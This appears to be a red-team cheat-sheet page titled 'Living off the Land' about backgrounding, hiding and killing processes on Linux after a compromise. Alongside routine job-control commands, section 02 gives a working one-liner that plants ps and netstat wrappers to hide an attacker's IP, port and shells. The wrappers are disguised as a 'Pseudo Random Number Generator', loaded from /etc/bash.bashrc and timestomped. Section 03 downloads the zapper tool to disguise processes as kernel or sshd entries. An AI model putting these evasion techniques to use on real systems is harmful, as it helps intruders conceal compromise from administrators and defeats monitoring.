# Living off the Land

## 01 - Fork Background Process

```
$ <command> [arguments] &
```

List background jobs.

```
$ jobs
```

Check running background jobs.

```
$ bg [job_id_1] [job_id_n]
```

Interact with background process.

```
$ fg [job_id]
```

Terminate the latest job.

```
$ kill %1
```

## 02 - Hidden Process

> [!CAUTION] OPSEC Consideration
> This does not hide the command line arguments.

```
$ <commands> <(<commands>)

$ (exec -a syslogd <commands>)
```

Creating a shell function in the resource files (`~/.bashrc`, `~/.zshrc`) to make the process hidden.

```
$ echo -e 'netstat(){ command netstat "$@" | grep -Fv -e :<attacker_PORT> -e <attacker_IP>; } ps(){ command ps "$@" | exec -a GREP grep -Fv -e /bin/bash -e GREP; }' > /usr/bin/prng \ &&
echo ". prng #Initialize Pseudo Random Number Generator" >>/etc/bash.bashrc \ &&
touch -r /etc/ld.so.conf /usr/bin/prng /etc/bash.bashrc
```

## 03 - Hidden Commands

Download pre-compiled binary.

```
$ curl -fL -o zapper https://github.com/hackerschoice/zapper/releases/latest/download/zapper-linux-$(uname -m)

$ wget --no-hsts -qO zapper https://github.com/hackerschoice/zapper/releases/latest/download/zapper-linux-$(uname -m)

$ chmod 755 zapper
```

Execute commands but zap all options and show it as `klog` in the process list.

```
$ ./zapper -a klog <commands>
```

Started as a daemon and sshd-style name.

```
$ (./zapper -a 'sshd: root@pts/0' <commands> &)
```

## 04 - Multiplexer

### 4.1 - GNU Screen

Use the multiplexer to execute commands then attach the session name.

```
$ screen -dmS <session_name> <commands>

$ screen -x <session_name>
```

### 4.2 - Tmux

Use the multiplexer to execute commands then attach the session name.

```
$ tmux
```

## 05 - Terminating Process

Terminate process with an identifier.

```
$ kill -9 <pid>
```

Terminate process with a string.

```
$ pkill -9 <program>
```

## 06 - Suspend Process

```
$ kill -SIGSTOP <pid>
```

---
## References

### Backlinks

- [[06 - Tactics & Techniques & Procedures Phases/F - Post Exploitation/0x00 - Discovery/Desktop/Linux/Host/0xA - Internal Reconnaissance/Processes/List Processes/Manual/Living off the Land]]

### Source Repositories

- [hackerschoice: THC's favourite Tips, Tricks & Hacks (Cheat Sheet)](https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet)

- [hackerschoice: zapper](https://github.com/hackerschoice/zapper)